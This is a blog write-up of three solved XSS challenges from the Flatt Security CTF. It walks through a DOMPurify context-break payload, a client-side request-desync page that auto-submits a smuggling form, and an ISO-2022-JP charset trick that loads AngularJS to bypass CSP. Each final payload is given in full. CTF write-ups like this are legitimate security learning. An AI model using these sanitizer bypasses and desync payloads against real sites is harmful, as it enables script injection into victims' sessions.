---

layout: post

title: "Flatt Security XSS Challenge - Writeup"

date: 2024-11-29

tag-name: xss client-side-desync charset-encoding 

---


![Image 1](/images/flatt-xss/Screenshot 2024-11-29 at 18.12.06.png)

Impossible not to play.

## Server-Side Sanitization by hamayanhamayan

This was the easiest among all the challenges, yet it teaches a nice quirk to achieve XSS when <mark style="background: #FFB86CA6;">server-side sanitization</mark> is applied.

The challenge is straightforward. 

```javascript
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.get('/', (req, res) => {
  const message = req.query.message;
  if (!message || typeof message !== 'string') {
    return res.redirect(`/?message=Yes%2C%20<b>we%20can<%2Fb>%21`);
  }
  const sanitized = DOMPurify.sanitize(message);
  res.view("/index.ejs", { sanitized: sanitized });
});
```

There is some server-side logic where a query parameter is sanitized via my everlasting enemy DOMPurify. Once sanitized, the payload is reflected into the page in two different points.

```html
<div class="card">
	<h1>Paper Airplane</h1>
    <p class="message"><%- sanitized %></b></p>
    <form method="get" action="">
        <textarea name="message"><%- sanitized %></textarea>
        <p>
            <input type="submit" value="View 👀" formaction="/" />
        </p>
    </form>
</div>
```

How we can achieve XSS is quite simple. Essentially the sanitization that occurs server side has no context on what will be the context where our payload will be reflected. 

By leveraging this assumption we can carefully create an HTML tag that when injected into the browser breaks the context but will be completely ignored by DOMPurify. How? By using <mark style="background: #FFB86CA6;">attributes</mark> 

```html
<a id='</textarea><img src=a onerror=alert(origin)>'/>
```

The content of the `id` attribute will be completely ignored by DOMPurify, but when injected into the page it will break the `textarea` tag, leaving our malicious tag untouched. Hence, an alert will pop up

```html
<div class="card">
	<h1>Paper Airplane</h1>
    <p class="message"><a id="</textarea><img src=a onerror=alert(origin)>"></a></p>
    <form method="get" action="">
        <textarea name="message">&lt;a id="</textarea><img src="a" onerror="alert(origin)">"&gt;
        <p>
            <input type="submit" value="View 👀" formaction="/">
        </p>
    </form>
</div>
```

## Client-Side Desync by RyotaK - w/ smaury92

The challenge is not straightforward. It mimics an html editor, with a couple of twists. 
We can inject arbitrary html code on the editor, this will be saved server-side by giving it an UUIDv4 which later will be used to retrieve it. Sounds quite simple right? The problem is that when retrieved our HTML code will be converted using `html.escape` which uses <mark style="background: #FFB86CA6;">HTML entities</mark> to nullify our payload. 
This will be later injected into the page, but not before having sanitized it with a <mark style="background: #FFB86CA6;">custom sanitizer</mark>.

This sounds unexploitable right? Well, in a standard use flow this is unbreakable, but by analyzing carefully the source code there is one thing that stands out. 

```python
def do_GET(self):
    parsed_path = urlparse.urlparse(self.path)
    path = parsed_path.path
    query = urlparse.parse_qs(parsed_path.query)
    if path == "/":
        self.send_response(200)
        self.send_header('Cache-Control', 'max-age=3600')
        self.send_data(self.content_type_html, bytes(index_html, 'utf-8'))
    elif path == "/api/drafts":
        draft_id = query.get('id', [''])[0]
        if draft_id in drafts:
            escaped = html.escape(drafts[draft_id])
            self.send_response(200)
            self.send_data(self.content_type_text, bytes(escaped, 'utf-8'))
        else:
            self.send_response(200)
            self.send_data(self.content_type_text, b'')
    else:
        self.send_response(404)
	    self.send_data(self.content_type_text, bytes('Path %s not found' % self.path, 'utf-8'))
```

The `do_GET` method handles the case where the path that we are requesting does not exists. Our path will be reflected directly into the page, but `text/plain` will be used as Content-Type.
This means that if we request something like `/<img src=a>` we will get a response like the following:

```text
Path /<img src=a> not found
```

As you may already noticed, the webserver used is really crappy. As soon as i've noticed it, my mind started to think about <mark style="background: #FFB86CA6;">request smuggling</mark>. Indeed, that's the right path.

Think about it. We cannot do nothing in the standard flow. So what if, we manage to smuggle a request? In our case, if we smuggle the request that retrieves the encoded HTML, we can achieve an injection. Still, there is the sanitizer to bypass, but one thing at a time.

How is possible to achieve smuggling? Let's read more code:

```python
def do_POST(self):
    content_length = int(self.headers.get('Content-Length'))
    if content_length > 100:
        self.send_response(413)
        self.send_data(self.content_type_text, b'Post is too large')
        return
    body = self.rfile.read(content_length)
    draft_id = str(uuid4())
    drafts[draft_id] = body.decode('utf-8')
    self.send_response(200)
    self.send_data(self.content_type_text, bytes(draft_id, 'utf-8'))
```

My first idea was to abuse something like setting the `Content-Length` to zero but providing a body that will be retrieved as a subsequential request. Unfortunately i don't think it's possible to set `Content-Length` to zero by using the Fetch API.

The right idea, in this case, is to abuse the check performed on the `Content-Length`. If it's greater than 100, an error is provided. But more importantly is that the content of the <mark style="background: #FFB86CA6;">body is not read</mark>. This will leave the content on the socket, and can be leveraged to smuggle the next request. 

Here is an example request that creates the smuggling:

```http
POST / HTTP/1.1
Host: 34.171.202.118
Content-Length: 135

GET /<img src=A> HTTP/1.1 
GET /<img src=A> HTTP/1.1 
GET /<img src=A> HTTP/1.1 
GET /<img src=A> HTTP/1.1 
GET /<img src=A> HTTP/1.1
```

I was a bit <mark style="background: #FFB86CA6;">stucked</mark> at this point. Because the main problem is that we need to smuggle the request that retrieves the safe content from the backend. Here is where, by chatting with <mark style="background: #FFB86CA6;">smaury</mark>, the solution came up.

The flow is the following:

- The bot visits the page
- On the page there is an `iframe` pointing to the challenge page with a valid ID used to retrieve the safe content
- On the same page there is also a `form` that will be summited using the `iframe` as target. This will be used in order to create the smuggling.
- The smuggling form will be autosubmitted after 1 second.
- After 1 more second, the iframe is redirected back to the homepage. This will not issue any request since the page is <mark style="background: #FFB86CA6;">cached</mark>
- The page issue the request in order to retrieve the safe content, but it will recieve the unsanitized path containing our malicious HTML tag
- The XSS doesn't pop, since there is the sanitizer :rofl:

Jokes aside, there is the sanitizer to bypass. How i did it? By fuzzing. I've used a bunch of old mXSS payloads and tweaked the attributes in order to make everything works. I've not fully understood why my payload is working, but indeed it works.

Here there's the final payload:

```html
<html>
    <head></head>
    <body>
        <iframe width="1000" height="1000" id="watermelon" name="watermelon" src="http://34.171.202.118/?draft_id=b6921e21-4951-4fc2-a209-789c5d7b509f"></iframe>
        <form target="watermelon" action="http://34.171.202.118/api/drafts?id=b6921e21-4951-4fc2-a209-789c5d7b509f" method="POST" enctype="text/plain">
            <textarea name="http"></textarea>
        </form>
        <script>
            document.forms[0].http.name = `GET /<svg></p><style><g/title="</style><img/i/src/a/onerror=alert(origin)>test</details>"> HTTP/1.1\r\n`.repeat(5)
            setTimeout(()=>{
                document.forms[0].submit();
                setTimeout(()=>{watermelon.location.href="http://34.171.202.118/?draft_id=b6921e21-4951-4fc2-a209-789c5d7b509f"},1000)
            },1000)
        </script>
    </body>
</html>
```

I want to add one more thing. The usage of a `textarea` tag to hold the smuggle payload was something that i've took from another challenge. It's mindblowing to me.

## Charset Shenanigans by kinugawamasato - w/ strellic


Honestly at the beginning i didn't think that i've would be able to solve this challenge. The challenge doesn't have any server side logic. Here is the core of it

```javascript
function render(html) {
      const sanitizedHtml = DOMPurify.sanitize(html, { ALLOWED_ATTR: [], ALLOW_ARIA_ATTR: false, ALLOW_DATA_ATTR: false });
      const blob = new Blob([sanitizedHtml], { "type": "text/html" });
      const blobURL = URL.createObjectURL(blob);
      input.value = sanitizedHtml;
      window.open(blobURL, "iframe");
      createPermalink(sanitizedHtml);
    }
```

Quite small, isn't it? It's difficult to think that there is an XSS in here, but indeed there is. My idea was to, somehow, the payload from DOMPurify and later executed into the Blob. There were two main issues:

- I don't know how to do such thing
- DOMPurify was using a custom configuration where attributes were no longer usable.

Let's sort out the first thing. I started reading a bit about Blobs, and after a while i've noticed this.

![Image 2](/images/flatt-xss/Screenshot 2024-11-29 at 19.20.22.png)

In our case the Blob was not specifying the charset. That's really weird, mainly because i've never seen Blobs used with charset, and was something that i didn't know. 
Anyway this opened up a possibility: <mark style="background: #FFB86CA6;">encoding differential</mark>.

The main idea is explained here https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/. In short, it explains how the charset affects how the browser parses the HTML on the page.
Moreover it highlights a specific encoding `ISO-2022-JP` which can be leveraged to achieve XSS on pages where the `Content-Type` header has no charset specified.

This can be leveraged in the challenge, if the main page wouldn't specify the charset itself. This is where i spent the most time. I thought i was able to, somehow, fool the charset on the page since it was specified via a `meta` tag.

Here is where <mark style="background: #FFB86CA6;">strellic</mark> told me that this was completely wrong. Instead i need to look carefully at `window.open`. So i quickly opened https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/ this and started searching for interesting quirks. 
And here is where i learned another new thing. Apparently if a page opens a window and specify the window name via `window.open('/','whatever')` if the opened page opens a page with the same name, the page will be opened as the <mark style="background: #FFB86CA6;">top window</mark>.

The flow, now, is the following:

- The bot visits a page
- The page executes `window.open('https://challenge-kinugawa.quiz.flatt.training/?html=payload','iframe')`
- The Blob on the challenge page will open the sanitized payload as the top window instead that on the iframe. This will lead to a page with semi-arbitrary content without any <mark style="background: #FFB86CA6;">charset</mark> specified. Hence we can leverage the usage of `ISO-2022-JP`in order to achieve XSS

There's one major problem here. No attributes are allowed. Hence it's not that easy to hide a malicious payload from DOMPurify. 
By chatting again with strellic, it turns out that we simply need an <mark style="background: #FFB86CA6;">open tag</mark> and then achieving XSS would be possible. 
The only RAWTEXT element allowed by DOMPurify is the `style`tag. Anyway, DOMPurify denies the usage of something like this:

```html
<style><img</style>
```

The dangling `img` tag will be completely removed from DOMPurify, since it has a regex like the following. 

```javascript
if (
      SAFE_FOR_XML &&
      currentNode.nodeType === NODE_TYPE.comment &&
      regExpTest(/<[/\w]/g, currentNode.data)
    ) {
      _forceRemove(currentNode);
      return true;
    }
```

At this point i've realized that, indeed, we are not parsing via the standard UTF-8. Maybe we can leverage some sequences of the ISO-2022-JP in order to create a valid tag for the browser that will skip the DOMPurify check. 

If you have read the research, you may know that the <mark style="background: #FFB86CA6;">sequence</mark> `\x1b(B` is used to switch the parsing to ASCII. Hence, something like `<style>\x1b(B<\x1b(Bimg</style>` should work. And indeed it works.
This payload will be left untouched from DOMPurify since it's considered safe. Spoiler: it's not

Now we have all we need. I should point out that there is CSP but is easily bypassable (i've used cspbypass.com in order to find the payload)

Here it is the final payload 

```html
<html>
    <head></head>
    <body></body>
    <script>

        const URL = `https://challenge-kinugawa.quiz.flatt.training/?html=`
        const back_to_ascii = `\x1b(B`
        const back_to_jp = `\x1b$B`;
        const payload = `${back_to_jp}
        <style>
            ff${back_to_ascii}<${back_to_ascii}body ng-app ng-csp>
                ${back_to_ascii}<${back_to_ascii}script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js'>${back_to_ascii}<${back_to_ascii}/script>
                    ${back_to_ascii}<${back_to_ascii}input autofocus ng-focus=$event.composedPath()|orderBy:'[].constructor.from([origin],alert)'>
        </style>`

        open(URL+encodeURIComponent(payload),'iframe')


    </script>
</html>
```

## Conclusion

It was an amazing experience. Either by solving fantastic challenges, and collaborating with skilled hackers. 
Last but not least, i've learned a lot. Which is the most important thing to me.
